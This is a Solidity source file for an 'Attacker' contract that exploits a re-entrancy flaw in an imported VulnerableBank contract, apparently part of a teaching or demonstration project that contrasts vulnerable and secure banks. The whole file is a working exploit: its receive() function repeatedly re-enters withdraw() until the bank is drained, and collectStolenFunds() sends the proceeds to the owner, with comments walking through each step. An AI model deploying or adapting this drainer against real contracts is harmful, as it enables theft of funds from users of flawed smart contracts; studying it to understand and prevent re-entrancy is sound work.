// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev A malicious contract that exploits the re-entrancy vulnerability in VulnerableBank
 * 
 * ATTACK MECHANISM:
 * This contract uses its receive() fallback function to create a recursive loop.
 * When the VulnerableBank sends Ether during withdrawal, it triggers receive(),
 * which immediately calls withdraw() again before the bank updates its state.
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev Initiates the attack by depositing a small amount and then withdrawing
     * The withdrawal will trigger the re-entrancy loop via the receive() function
     */
    function attack() external payable {
        require(msg.value > 0, "Need some Ether to start the attack");
        
        // Step 1: Deposit Ether to establish a balance in the vulnerable contract
        vulnerableBank.deposit{value: msg.value}();
        
        // Step 2: Trigger the first withdrawal, which will start the re-entrancy loop
        vulnerableBank.withdraw();
    }
    
    /**
     * @dev CRITICAL: This fallback function is automatically called when the contract receives Ether
     * 
     * ATTACK LOGIC:
     * 1. VulnerableBank sends Ether during withdraw()
     * 2. This receive() function is triggered
     * 3. We check if the bank still has funds
     * 4. If yes, we call withdraw() again (RE-ENTRY)
     * 5. Loop continues until bank is drained
     * 
     * The key is that VulnerableBank hasn't updated our balance yet,
     * so the balance check in withdraw() still passes!
     */
    receive() external payable {
        // Check if the vulnerable bank still has Ether to drain
        if (address(vulnerableBank).balance >= 1 ether) {
            // Re-enter the withdraw function before the bank updates our balance
            // Use try-catch to handle secure banks that prevent re-entrancy
            try vulnerableBank.withdraw() {
                // Attack succeeded
            } catch {
                // Attack was prevented (secure bank)
            }
        }
    }
    
    /**
     * @dev Allows the attacker to collect the stolen funds
     */
    function collectStolenFunds() external {
        require(msg.sender == owner, "Only owner can collect");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Returns the attacker contract's balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
